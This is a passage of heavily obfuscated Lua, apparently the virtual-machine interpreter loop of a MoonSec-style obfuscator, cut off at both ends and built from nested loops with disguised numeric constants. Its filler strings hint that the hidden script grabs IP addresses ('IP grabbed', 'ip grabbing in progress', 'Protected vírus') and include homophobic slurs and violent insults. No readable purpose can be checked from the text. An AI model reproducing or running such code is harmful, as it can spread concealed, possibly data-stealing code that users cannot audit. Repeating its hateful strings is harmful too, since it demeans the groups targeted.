n;l[e[i]]=M[e[w]];o=o+d;e=a[o];l[e[b]]=l[e[f]][e[S]];o=o+d;e=a[o];n=e[i];h=l[e[w]];l[n+1]=h;l[n]=h[e[N]];o=o+d;e=a[o];l[e[i]]=l[e[U]];o=o+d;e=a[o];l[e[i]]=l[e[U]];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];n=e[t];h=l[e[w]];l[n+1]=h;l[n]=h[e[D]];o=o+d;e=a[o];n=e[c]l[n]=l[n](l[n+u])o=o+d;e=a[o];r={l,e};r[u][r[g][b]]=r[d][r[g][B]]+r[u][r[g][w]];o=o+d;e=a[o];l[e[c]]=l[e[s]]%e[B];o=o+d;e=a[o];n=e[i]l[n]=l[n](l[n+u])o=o+d;e=a[o];h=e[w];k=l[h]for e=h+1,e[N]do k=k..l[e];end;l[e[t]]=k;o=o+d;e=a[o];r={l,e};r[u][r[g][t]]=r[d][r[g][S]]+r[u][r[g][x]];o=o+d;e=a[o];l[e[i]]=l[e[x]]%e[_];break end while 3393==(n)/((-#"Fucking losed 027728272728271"+(546700/0x8c)))do l[e[c]][l[e[f]]]=l[e[B]];break end;break;end while 3357==(n)/(((0x138+(-0x4c4a/155))+-#"qwertyui is hot"))do n=(2656962)while(-#'Russian letters'+(0x547e/210))>=r do n-= n local r;local n;l[e[c]]=l[e[w]][e[_]];o=o+d;e=a[o];l[e[i]]=l[e[w]][e[D]];o=o+d;e=a[o];l[e[c]]=l[e[U]][e[S]];o=o+d;e=a[o];n=e[i];r=l[e[x]];l[n+1]=r;l[n]=r[e[B]];o=o+d;e=a[o];l[e[k]]=e[s];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[O]))o=o+d;e=a[o];l[e[h]]=M[e[U]];o=o+d;e=a[o];l[e[t]]=e[s];o=o+d;e=a[o];n=e[i]l[n](l[n+u])o=o+d;e=a[o];o=e[x];break;end while(n)/((360822/((0x26b-368)+-#'Crackzzzz')))==1782 do n=(1667624)while((3586-0x70e)/20)<r do n-= n y[e[O]]=l[e[k]];break end while(n)/((0x61230/162))==679 do local n=e[h];local r=e[N];local a=n+2 local n={l[n](l[n+1],l[a])};for e=1,r do l[a+e]=n[e];end;local n=n[1]if n then l[a]=n o=e[x];else o=o+d;end;break end;break;end break;end break;end while(n)/(((179396/(0x185-217))+-#[[furries should die]]))==2495 do n=(12885984)while r<=(-#'moonsec got deobfuscated'+(349-0xe9))do n-= n n=(6075918)while r>((0x6660/234)+-#'federal communication')do n-= n l[e[b]]=M[e[x]];break end while 3041==(n)/((0x75120/240))do local r;local n;l[e[h]]=l[e[O]][e[S]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[S]];o=o+d;e=a[o];l[e[t]]=l[e[O]][e[_]];o=o+d;e=a[o];n=e[b];r=l[e[U]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[b]]=e[O];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[f]))o=o+d;e=a[o];l[e[b]]=M[e[O]];o=o+d;e=a[o];l[e[i]]=e[f];o=o+d;e=a[o];n=e[c]l[n](l[n+u])o=o+d;e=a[o];o=e[O];break end;break;end while 3544==(n)/((0x1ca5-3697))do n=(12698166)while r<=(0x2b3b/119)do n-= n M[e[s]]=l[e[h]];break;end while 3714==(n)/((0x56cf8/104))do n=(4578678)while((-88+0xc6)+-#"iPipeh Is My god")<r do n-= n l[e[i]]=y[e[U]];o=o+d;e=a[o];l[e[k]]=#l[e[x]];o=o+d;e=a[o];y[e[O]]=l[e[t]];o=o+d;e=a[o];l[e[k]]=y[e[s]];o=o+d;e=a[o];l[e[h]]=#l[e[x]];o=o+d;e=a[o];y[e[O]]=l[e[k]];o=o+d;e=a[o];do return end;break end while(n)/((2028+-0x27))==2302 do if(l[e[t]]~=l[e[D]])then o=o+u;else o=e[f];end;break end;break;end break;end break;end break;end while(n)/((25992/0x8))==2063 do n=(8708370)while r<=(0xa7+-67)do n-= n n=(2368618)while(126+-0x1d)>=r do n-= n n=(5919035)while(-#[[Fucking losed 027728272728271]]+(-0x76+243))<r do n-= n if(l[e[c]]~=l[e[N]])then o=o+u;else o=e[O];end;break end while(n)/((0x1a6b-3398))==1759 do local d=e[x];local o=l[d]for e=d+1,e[B]do o=o..l[e];end;l[e[i]]=o;break end;break;end while(n)/((-#[[rule 2 ok]]+(5236-0xa62)))==922 do n=(15702852)while(0x113a/45)>=r do n-= n local r;local n;l[e[c]][e[s]]=l[e[S]];o=o+d;e=a[o];n=e[k]l[n](P(l,n+u,e[U]))o=o+d;e=a[o];n=e[t];r=l[e[f]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[c]][e[x]]=e[S];break;end while 4044==(n)/((0xd9177/229))do n=(12926288)while r>(0xda-(0xb4+-61))do n-= n local n;l[e[i]][e[U]]=e[_];o=o+d;e=a[o];l[e[i]]=M[e[w]];o=o+d;e=a[o];n=e[i]l[n]=l[n]()o=o+d;e=a[o];l[e[i]][e[O]]=e[B];o=o+d;e=a[o];l[e[c]]=M[e[s]];o=o+d;e=a[o];n=e[t]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[s]]=e[B];o=o+d;e=a[o];l[e[b]]=M[e[w]];o=o+d;e=a[o];n=e[c]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[w]]=e[C];break end while 3559==(n)/((-0x77+3751))do local r;local n;l[e[h]][e[f]]=l[e[C]];o=o+d;e=a[o];n=e[t]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];n=e[b];r=l[e[w]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[b]]={};o=o+d;e=a[o];l[e[h]][e[w]]=e[B];break end;break;end break;end break;end while 3630==(n)/((-108+0x9cb))do n=(6789800)while(0xe8-129)>=r do n-= n n=(1651032)while(0x28a3/103)>=r do n-= n local n;l[e[t]]=l[e[s]][e[B]];o=o+d;e=a[o];l[e[c]]=l[e[s]][e[N]];o=o+d;e=a[o];l[e[c]]=l[e[U]][e[S]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[i]]=M[e[x]];o=o+d;e=a[o];l[e[k]]=l[e[w]][e[D]];o=o+d;e=a[o];l[e[i]]=e[x];o=o+d;e=a[o];l[e[h]]=e[U];o=o+d;e=a[o];l[e[t]]=e[s];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[c]][e[f]]=l[e[B]];o=o+d;e=a[o];o=e[f];break;end while(n)/((-0x47+4059))==414 do n=(3270176)while(282-0xb4)<r do n-= n local i;local r;local n;l[e[h]]=e[w];o=o+d;e=a[o];l[e[c]]=e[x];o=o+d;e=a[o];l[e[t]]=#l[e[U]];o=o+d;e=a[o];l[e[b]]=e[O];o=o+d;e=a[o];n=e[k];r=l[n]i=l[n+2];if(i>0)then if(r>l[n+1])then o=e[x];else l[n+3]=r;end elseif(r<l[n+1])then o=e[O];else l[n+3]=r;end break end while(n)/((271766/(0xdc+-99)))==1456 do local e={l,e};e[u][e[g][i]]=e[d][e[g][S]]+e[u][e[g][s]];break end;break;end break;end while(n)/(((0xfd7-2050)+-#[[When the]]))==3400 do n=(9057906)while(0x2e50/114)>=r do n-= n local r;local n;l[e[h]]={};o=o+d;e=a[o];l[e[t]]=y[e[s]];o=o+d;e=a[o];l[e[i]][e[x]]=l[e[N]];o=o+d;e=a[o];l[e[i]][e[w]]=e[S];o=o+d;e=a[o];l[e[t]]={};o=o+d;e=a[o];l[e[k]][e[s]]=e[C];o=o+d;e=a[o];l[e[b]][e[O]]=l[e[C]];o=o+d;e=a[o];l[e[h]]=M[e[O]];o=o+d;e=a[o];n=e[k];r=l[e[O]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[c]]=e[U];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];n=e[k];r=l[e[f]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[c]]=l[e[f]];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];l[e[b]][e[O]]=l[e[D]];o=o+d;e=a[o];n=e[b]l[n]=l[n](l[n+u])o=o+d;e=a[o];o=e[x];break;end while 3366==(n)/(((523218/0xc2)+-#"uhhhhh"))do n=(1304208)while r>(0x2d1e/110)do n-= n local n;l[e[i]]=M[e[s]];o=o+d;e=a[o];n=e[c]l[n]=l[n]()o=o+d;e=a[o];l[e[h]][e[s]]=l[e[B]];o=o+d;e=a[o];l[e[b]]=M[e[O]];o=o+d;e=a[o];l[e[b]]();o=o+d;e=a[o];do return end;break end while 3019==(n)/(((0x1ec+-47)+-#'Bush Did 9 11'))do l[e[h]]();break end;break;end break;end break;end break;end break;end while(n)/((-84+0xf84))==1273 do n=(2775367)while((25254/0xb7)+-#'Oh hes too mainstream')>=r do n-= n n=(7110395)while r<=((171+-0x2e)+-#[[ooga booga sex]])do n-= n n=(10611069)while(-63+0xab)>=r do n-= n n=(14596744)while((0x20b-292)-124)<r do n-= n local r;local n;l[e[k]][e[x]]=l[e[S]];o=o+d;e=a[o];n=e[i]l[n](P(l,n+u,e[O]))o=o+d;e=a[o];n=e[t];r=l[e[s]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[t]]={};o=o+d;e=a[o];l[e[k]][e[x]]=e[S];o=o+d;e=a[o];l[e[t]][e[O]]=e[D];o=o+d;e=a[o];l[e[c]][e[s]]=e[C];break end while 3701==(n)/((7980-0xfc4))do l[e[h]]=#l[e[s]];break end;break;end while(n)/(((0xc27+-23)+-#"Protected vírus"))==3453 do n=(3501468)while r<=(285-0xb0)do n-= n local e=e[c]l[e]=l[e](l[e+u])break;end while 1212==(n)/((5810-0xb69))do n=(3485675)while(0xdd+-111)<r do n-= n l[e[c]]=v(j[e[U]],nil,M);break end while 2081==(n)/((0x60824/236))do local r;local n;n=e[h]l[n](l[n+u])o=o+d;e=a[o];l[e[h]]=M[e[f]];o=o+d;e=a[o];l[e[c]]=l[e[s]][e[_]];o=o+d;e=a[o];l[e[h]]=l[e[f]][e[S]];o=o+d;e=a[o];l[e[b]]=M[e[f]];o=o+d;e=a[o];l[e[k]]=e[f];o=o+d;e=a[o];n=e[t]l[n](l[n+u])o=o+d;e=a[o];l[e[i]]=M[e[x]];o=o+d;e=a[o];l[e[h]]=M[e[w]];o=o+d;e=a[o];n=e[i];r=l[e[f]];l[n+1]=r;l[n]=r[e[S]];break end;break;end break;end break;end while 3713==(n)/(((989330/0xfe)-0x7bc))do n=(1412683)while(0x142-((-0x6b+321)+-#'im gay'))>=r do n-= n n=(8565376)while(-36+0x94)>=r do n-= n local r;local t,U;local n;n=e[h]t,U=p(l[n](P(l,n+1,e[w])))m=U+n-1 r=0;for e=n,m do r=r+d;l[e]=t[r];end;o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,m))o=o+d;e=a[o];n=e[c]l[n]=l[n]()o=o+d;e=a[o];l[e[h]]=l[e[x]][e[B]];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[k]][e[f]]=e[D];o=o+d;e=a[o];l[e[b]][e[O]]=e[_];o=o+d;e=a[o];l[e[h]][e[w]]=e[D];o=o+d;e=a[o];l[e[i]]=M[e[s]];o=o+d;e=a[o];l[e[h]]=l[e[x]][e[N]];break;end while(n)/((0x1ef6-4022))==2194 do n=(9344160)while r>(243-0x82)do n-= n local e=e[i]l[e]=l[e]()break end while 3240==(n)/((-#"negative chromosomes"+(0x7b5d0/174)))do local d=e[b];local a=l[d]local n=l[d+2];if(n>0)then if(a>l[d+1])then o=e[O];else l[d+3]=a;end elseif(a<l[d+1])then o=e[x];else l[d+3]=a;end break end;break;end break;end while(n)/(((0x1d00-3750)+-#"Well thats what they do when they get jealous they confuse it"))==391 do n=(8500762)while r<=((-104+0xe3)+-#"lego hax")do n-= n local r;local n;l[e[c]]=e[U];o=o+d;e=a[o];n=e[b]l[n]=l[n](P(l,n+d,e[O]))o=o+d;e=a[o];n=e[i];r=l[e[w]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[b]]=e[x];o=o+d;e=a[o];n=e[b]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];n=e[c];r=l[e[f]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[b]]=e[O];o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];n=e[b];r=l[e[f]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[b]]=e[s];break;end while 2654==(n)/((-85+0xcd8))do n=(2434895)while r>((258+(-#'federal communication'+(0x15+-67)))+-#'fun fact if you want to say discord just type Discord with a capital D boom')do n-= n local o=e[i];local d=l[o];for e=o+1,e[f]do F(d,l[e])end;break end while(n)/((0x9a3df/185))==713 do local r;local n;l[e[i]]=l[e[w]][e[N]];o=o+d;e=a[o];l[e[i]]=l[e[w]][e[C]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[D]];o=o+d;e=a[o];n=e[b];r=l[e[f]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[h]]=e[O];o=o+d;e=a[o];n=e[t]l[n](P(l,n+u,e[s]))o=o+d;e=a[o];l[e[b]]=M[e[U]];o=o+d;e=a[o];l[e[i]]=e[f];o=o+d;e=a[o];n=e[i]l[n](l[n+u])o=o+d;e=a[o];o=e[f];break end;break;end break;end break;end break;end while(n)/((0x327+-46))==3647 do n=(3730324)while r<=(-#"get some bitches"+(0x24a8/68))do n-= n n=(1077936)while(318-0xc7)>=r do n-= n n=(6004352)while(-#"fix ownerof"+(-0x3a+187))<r do n-= n local d=e[f];local o=l[d]for e=d+1,e[N]do o=o..l[e];end;l[e[h]]=o;break end while(n)/(((0x186c-3168)+-#"whats up"))==1952 do local o=e[i]local n={l[o](P(l,o+1,m))};local a=0;for e=o,e[S]do a=a+d;l[e]=n[a];end break end;break;end while(n)/(((0x6e06e/170)+-#'Alma Alma'))==408 do n=(9701440)while(960/0x8)>=r do n-= n local o=e[t];local d=l[o];for e=o+1,e[x]do F(d,l[e])end;break;end while 2485==(n)/((3950+-0x2e))do n=(10642800)while(18997/0x9d)<r do n-= n local r;local n;l[e[k]][e[O]]=l[e[B]];o=o+d;e=a[o];n=e[t]l[n](P(l,n+u,e[f]))o=o+d;e=a[o];n=e[t];r=l[e[U]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[h]][e[U]]=e[C];o=o+d;e=a[o];l[e[k]][e[w]]=e[B];o=o+d;e=a[o];l[e[k]][e[x]]=e[N];break end while 2715==(n)/(((0x1ecc-3958)+-#'im gay'))do l[e[k]]=e[w];o=o+d;e=a[o];l[e[b]]=e[U];o=o+d;e=a[o];l[e[h]]=e[x];o=o+d;e=a[o];l[e[k]]=e[x];o=o+d;e=a[o];l[e[b]]=e[s];o=o+d;e=a[o];l[e[h]]=e[U];o=o+d;e=a[o];l[e[k]]=e[f];o=o+d;e=a[o];l[e[t]]=e[U];o=o+d;e=a[o];l[e[b]]=e[O];o=o+d;e=a[o];l[e[c]]=e[O];break end;break;end break;end break;end while(n)/((0x189d-3182))==1196 do n=(4106883)while(0x4268/136)>=r do n-= n n=(9012460)while r<=((0x1a0-260)+-#"qwertyui is not hot and is a skid")do n-= n local n;l[e[c]]=M[e[w]];o=o+d;e=a[o];n=e[b]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[O]]=l[e[_]];o=o+d;e=a[o];l[e[k]]=M[e[O]];o=o+d;e=a[o];l[e[i]]();o=o+d;e=a[o];do return end;break;end while(n)/((-0x7d+2689))==3515 do n=(6672491)while(0x7918/250)<r do n-= n local e=e[k]local a,o=p(l[e](l[e+u]))m=o+e-d local o=0;for e=e,m do o=o+d;l[e]=a[o];end;break end while(n)/((3634-0x72b))==3709 do local o=e[b];local d=l[e[x]];l[o+1]=d;l[o]=d[e[C]];break end;break;end break;end while 3201==(n)/(((0xa52-1345)+-#'FranzJPresents'))do n=(6851936)while r<=((-0x7d+281)+-#"imagine not being able to talk")do n-= n local r;local n;l[e[h]][e[w]]=e[S];o=o+d;e=a[o];l[e[i]][e[x]]=e[D];o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,e[s]))o=o+d;e=a[o];n=e[b];r=l[e[O]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[t]][e[U]]=e[N];o=o+d;e=a[o];l[e[k]][e[x]]=e[_];o=o+d;e=a[o];l[e[k]][e[f]]=e[_];break;end while 2366==(n)/((-24+(700800/0xf0)))do n=(616882)while(366-0xef)<r do n-= n local e=e[k]l[e](P(l,e+u,m))break end while 973==(n)/((0x20320/208))do local o=e[i]l[o]=l[o](P(l,o+d,e[w]))break end;break;end break;end break;end break;end break;end break;end while 405==(n)/((((0x13b5+-110)+-#[[i love tatakai]])-2502))do n=(254898)while(0x102+-109)>=r do n-= n n=(10416754)while(0x58f2/165)>=r do n-= n n=(1605744)while(-94+0xe3)>=r do n-= n n=(79580)while(0xde+-92)>=r do n-= n n=(4268094)while(-#"number 15 you get no bitches"+(0x8d0e/230))<r do n-= n local o=e[i]l[o](P(l,o+u,e[U]))break end while(n)/((343908/0xf6))==3053 do local o=e[c]l[o](P(l,o+u,e[f]))break end;break;end while 865==(n)/((0x2e0/8))do n=(13865778)while(0x133-176)>=r do n-= n local r;local n;l[e[c]]={};o=o+d;e=a[o];l[e[i]]=y[e[s]];o=o+d;e=a[o];l[e[k]][e[x]]=l[e[D]];o=o+d;e=a[o];l[e[i]][e[w]]=e[D];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[t]][e[s]]=e[D];o=o+d;e=a[o];l[e[h]][e[f]]=l[e[N]];o=o+d;e=a[o];l[e[h]]=M[e[s]];o=o+d;e=a[o];n=e[i];r=l[e[w]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[k]]=e[x];o=o+d;e=a[o];n=e[b]l[n]=l[n](P(l,n+d,e[O]))o=o+d;e=a[o];n=e[i];r=l[e[f]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[t]]=l[e[x]];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[U]))o=o+d;e=a[o];l[e[i]][e[s]]=l[e[_]];o=o+d;e=a[o];n=e[c]l[n]=l[n](l[n+u])break;end while 3842==(n)/(((0x1c83-3680)+-#'IP grabbed'))do n=(101983)while((0x30b-444)-203)<r do n-= n l[e[b]][e[x]]=e[D];break end while 857==(n)/((-#'Mulheres me deixam de pau duro'+(30843/0xcf)))do local r;local n;l[e[h]]=M[e[x]];o=o+d;e=a[o];n=e[i];r=l[e[U]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[c]]=e[w];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];l[e[h]]=M[e[w]];o=o+d;e=a[o];n=e[k];r=l[e[w]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[h]]=e[s];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];l[e[i]]=l[e[s]][e[D]];o=o+d;e=a[o];n=e[i];r=l[e[x]];l[n+1]=r;l[n]=r[e[B]];break end;break;end break;end break;end while 2268==(n)/((14160/0x14))do n=(8506134)while(-#'one foot is in the grave'+(-88+0xf7))>=r do n-= n n=(994565)while(25058/0xbb)<r do n-= n M[e[U]]=l[e[h]];break end while(n)/((0x5c0-((104312/0x88)+-#"send nudes")))==1391 do l[e[h]]=M[e[f]];break end;break;end while(n)/((0x237fc/42))==2457 do n=(3464846)while r<=((393-(-#[[this is a meme string]]+(0x25d-337)))+-#"e621DotNet")do n-= n l[e[t]][l[e[s]]]=l[e[N]];break;end while(n)/((-29+0x43e))==3278 do n=(7067550)while r>(-#"testing this thingy lololollez"+(0x16c-197))do n-= n l[e[k]]=l[e[s]];break end while(n)/((0x2a922/47))==1905 do local r;local n;l[e[c]]=l[e[f]][e[S]];o=o+d;e=a[o];l[e[k]]=l[e[O]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[w]][e[D]];o=o+d;e=a[o];n=e[i];r=l[e[U]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];n=e[h]l[n](l[n+u])o=o+d;e=a[o];l[e[h]]=M[e[s]];o=o+d;e=a[o];l[e[b]]=l[e[x]][e[S]];o=o+d;e=a[o];l[e[i]]();o=o+d;e=a[o];o=e[O];break end;break;end break;end break;end break;end while 3229==(n)/((-#"mbb is a frag"+(6509-0xcc6)))do n=(1127115)while r<=((375-0xd0)+-#[[one foot is in the grave]])do n-= n n=(975804)while(9940/0x47)>=r do n-= n n=(2996670)while r>(19321/0x8b)do n-= n local e=e[k]l[e]=l[e](P(l,e+d,m))break end while 2323==(n)/(((0xa82+-42)-1358))do l[e[b]]=(e[w]~=0);o=o+u;break end;break;end while 349==(n)/((-0x1b+2823))do n=(27756)while r<=(332-0xbf)do n-= n local n;n=e[h]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[w]]=e[_];o=o+d;e=a[o];l[e[c]]=M[e[U]];o=o+d;e=a[o];n=e[t]l[n]=l[n]()o=o+d;e=a[o];l[e[b]][e[x]]=e[D];o=o+d;e=a[o];l[e[h]]=M[e[O]];o=o+d;e=a[o];n=e[k]l[n]=l[n]()o=o+d;e=a[o];l[e[b]][e[U]]=e[S];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[t]]=M[e[x]];break;end while(n)/((0x243-322))==108 do n=(302064)while r>(0x15a-204)do n-= n local r;local n;l[e[c]]=l[e[U]][e[C]];o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[h]]=y[e[w]];o=o+d;e=a[o];l[e[t]][e[O]]=l[e[B]];o=o+d;e=a[o];l[e[i]][e[O]]=e[D];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[k]][e[w]]=e[_];o=o+d;e=a[o];l[e[h]][e[f]]=l[e[_]];o=o+d;e=a[o];l[e[i]]=M[e[O]];o=o+d;e=a[o];n=e[b];r=l[e[s]];l[n+1]=r;l[n]=r[e[B]];o=o+d;e=a[o];l[e[t]]=e[s];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];n=e[b];r=l[e[s]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[t]]=l[e[w]];o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];l[e[i]][e[s]]=l[e[_]];o=o+d;e=a[o];n=e[b]l[n]=l[n](l[n+u])o=o+d;e=a[o];o=e[U];break end while(n)/((-#'mbb is a frag'+(847-0x1ce)))==812 do local r;local n;l[e[c]][e[O]]=l[e[D]];o=o+d;e=a[o];n=e[t]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];n=e[t];r=l[e[x]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[t]][e[f]]=e[_];o=o+d;e=a[o];l[e[c]][e[O]]=e[N];o=o+d;e=a[o];l[e[k]][e[O]]=e[B];break end;break;end break;end break;end while(n)/((13915/0x5))==405 do n=(299532)while r<=(-#[[ip grabbing in progress]]+((665-0x180)+-0x70))do n-= n n=(2534500)while r<=(-#'fix ownerof'+(23715/0x99))do n-= n local r;local n;l[e[k]][e[s]]=l[e[N]];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];n=e[k];r=l[e[x]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[k]][e[f]]=e[D];o=o+d;e=a[o];l[e[t]][e[f]]=e[S];o=o+d;e=a[o];l[e[c]][e[x]]=e[B];break;end while(n)/((1946-0x3fd))==2740 do n=(3704070)while(0x109+-120)<r do n-= n local d=e[h];local n=l[d+2];local a=l[d]+n;l[d]=a;if(n>0)then if(a<=l[d+1])then o=e[U];l[d+3]=a;end elseif(a>=l[d+1])then o=e[O];l[d+3]=a;end break end while(n)/((0x1d80a/46))==1410 do local g;local r;local n;l[e[h]]={};o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[k]][e[U]]=e[C];o=o+d;e=a[o];l[e[t]][e[w]]=e[_];o=o+d;e=a[o];l[e[k]][e[U]]=e[N];o=o+d;e=a[o];l[e[h]]=M[e[O]];o=o+d;e=a[o];l[e[h]]=e[x];o=o+d;e=a[o];n=e[c]l[n]=l[n](l[n+u])o=o+d;e=a[o];l[e[h]][e[x]]=l[e[B]];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[b]][e[s]]=e[_];o=o+d;e=a[o];l[e[c]]=M[e[f]];o=o+d;e=a[o];n=e[i];r=l[e[s]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[h]]=e[x];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[O]))o=o+d;e=a[o];l[e[i]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[t]]=l[e[s]][e[B]];o=o+d;e=a[o];l[e[c]][e[f]]=l[e[B]];o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[k]][e[x]]=e[B];o=o+d;e=a[o];l[e[t]]=M[e[s]];o=o+d;e=a[o];n=e[t];r=l[e[U]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[b]]=e[x];o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];l[e[b]]=l[e[x]][e[_]];o=o+d;e=a[o];l[e[k]]=l[e[w]][e[_]];o=o+d;e=a[o];l[e[k]][e[U]]=l[e[N]];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[c]][e[s]]=e[B];o=o+d;e=a[o];l[e[k]]=M[e[O]];o=o+d;e=a[o];n=e[c];r=l[e[U]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[t]]=e[f];o=o+d;e=a[o];n=e[b]l[n]=l[n](P(l,n+d,e[O]))o=o+d;e=a[o];l[e[b]]=l[e[f]][e[D]];o=o+d;e=a[o];l[e[k]]=l[e[O]][e[_]];o=o+d;e=a[o];l[e[t]][e[x]]=l[e[D]];o=o+d;e=a[o];l[e[t]]={};o=o+d;e=a[o];l[e[t]][e[f]]=e[S];o=o+d;e=a[o];l[e[c]]=M[e[x]];o=o+d;e=a[o];n=e[h];r=l[e[O]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[c]]=e[x];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[t]]=l[e[s]][e[C]];o=o+d;e=a[o];l[e[h]]=l[e[s]][e[C]];o=o+d;e=a[o];l[e[k]][e[w]]=l[e[D]];o=o+d;e=a[o];l[e[b]]={};o=o+d;e=a[o];l[e[c]][e[x]]=e[S];o=o+d;e=a[o];l[e[t]]=M[e[w]];o=o+d;e=a[o];n=e[h];r=l[e[w]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[i]]=e[O];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];n=e[b];r=l[e[O]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];n=e[c]l[n]=l[n](l[n+u])o=o+d;e=a[o];l[e[t]][e[s]]=l[e[_]];o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[b]][e[x]]=e[D];o=o+d;e=a[o];l[e[t]]=M[e[U]];o=o+d;e=a[o];n=e[c];r=l[e[f]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[c]]=e[U];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[k]]=l[e[f]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[N]];o=o+d;e=a[o];l[e[k]]=l[e[f]][e[_]];o=o+d;e=a[o];n=e[b];r=l[e[x]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];n=e[k]l[n]=l[n](l[n+u])o=o+d;e=a[o];l[e[b]][e[O]]=l[e[_]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[t]][e[w]]=e[D];o=o+d;e=a[o];l[e[b]]=M[e[x]];o=o+d;e=a[o];n=e[k]l[n]=l[n]()o=o+d;e=a[o];l[e[i]][e[x]]=l[e[C]];o=o+d;e=a[o];n=e[k];g=l[n];for e=n+1,e[w]do F(g,l[e])end;break end;break;end break;end while(n)/((0x9e55/177))==1308 do n=(5412824)while(-74+0xdd)>=r do n-= n l[e[t]]=e[O];break;end while 1384==(n)/(((-0x26+3956)+-#'gay men'))do n=(2313425)while(-#"Faggot"+(-124+(0x190+-122)))<r do n-= n local 